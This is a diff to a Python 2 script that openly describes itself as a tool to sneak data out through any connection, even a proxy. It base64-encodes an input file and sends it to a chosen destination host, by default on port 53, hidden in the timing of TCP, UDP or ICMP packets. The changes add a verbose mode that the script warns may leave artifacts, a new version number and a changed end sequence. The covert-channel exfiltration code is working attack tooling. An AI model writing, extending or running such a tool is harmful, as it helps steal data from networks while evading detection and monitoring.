@@ -23,7 +23,6 @@ import base64
 import socket
 import time
 
-# TODO: Add verbose argument
 parser = argparse.ArgumentParser(description='Sneak data out through any ' +
     'connection that allows traffic to pass through, even if it\'s a '
     'regenerative proxy. Be aware that random latency can cause problems ' +
@@ -36,17 +35,18 @@ parser.add_argument('-d', nargs=1, metavar='<dst>',
 parser.add_argument('-p', nargs=1, metavar='port',
     help='Destination port (default is 53)')
 parser.add_argument('--proto', nargs=1, metavar='',
-    help='Protocol to use (t=TCP, u=UDP (default), i=ICMP) ICMP requires ' +
+    help='Protocol to use (t=TCP, u=UDP (default), i=ICMP); ICMP requires ' +
     'root access')
 parser.add_argument('-f', nargs=1, metavar='filename', help='Input file name')
 parser.add_argument('-r', nargs=1, metavar='integer',
     help='Number of packets to send per second ' +
     '(default 1; recommended is 5 or less)')
-parser.add_argument('-u', action='store_true', help='Source is in Unicode')
-parser.add_argument('-V', action='version', version='0.1',
+parser.add_argument('-v', action='store_true', help='Verbose mode (be aware ' +
+    'that this may leave behind artifacts)')
+parser.add_argument('-V', action='version', version='0.2',
     help='Display version number')
 parser.add_argument('-z', action='store_true',
-    help='Compress content before sending (not implemented)')
+    help='Compress content before sending (not implemented yet)')
 
 args = parser.parse_args()
 
@@ -68,7 +68,6 @@ if not args.r:
 else:
     pps = int(args.r[0])
 
-unistatus = args.u
 zipstatus = args.z
 
 if not args.proto:
@@ -86,7 +85,6 @@ else:
 # Set default packet data
 # TODO: Make this look more realistic
 # TODO: Come up with variable packet contents based on presumed protocol
-# TODO: When this gets big enough (past about four options), put in other file
 data = '436174686572696e65'.decode('hex')
 
 # Remove next after debugging complete
@@ -95,7 +93,6 @@ debug_count = 0
 
 # binstring takes a single character and converts it to an 8-character string
 #   of zeroes and ones
-# TODO: Write Unicode version of this
 def binstring(c):
     if (len(c) > 1) or (type(c) is not str):
         return None
@@ -110,6 +107,8 @@ def binstring(c):
 # after each timing gap
 def sendchar(c, delay):
     global debug_count
+    if args.v:
+        print '===============> ' + c + ' <==============='
     str1 = binstring(c)
     if str1 is None:
         return
@@ -141,7 +140,8 @@ def sendmessage(text, rate):
 # PONDER: Better to have timer here or in sendchar?
 def buildandsend(delay):
     global debug_count
-    print str(debug_count) + " Sending packet"
+    if args.v:
+        print str(debug_count) + " Sending packet"
     if (proto == 'TCP'):
         s = socket.socket(socket.AF_INET, socket.SOCK_STREAM, 0)
         s.connect((dest, dstport))
@@ -168,6 +168,12 @@ def buildandsend(delay):
 content = open(fin, mode='r')
 message = base64.b64encode(content.read())
 
+# Debug code to compare input and output
+if args.v:
+    tMessageFile = open('tempmessage-b64', 'wb')
+    tMessageFile.write(message)
+    tMessageFile.close
+
 # Synchronize the connection by sending eight packets
 print "Synchronizing..."
 sendmessage(chr(255), pps)
@@ -178,4 +184,4 @@ sendmessage(message, pps)
 
 # Close out the connection with ending sequence of 0x00FF
 print "Finishing up."
-sendmessage(chr(0) + chr(255), pps)
+sendmessage(chr(0) + chr(255) + chr(255), pps)
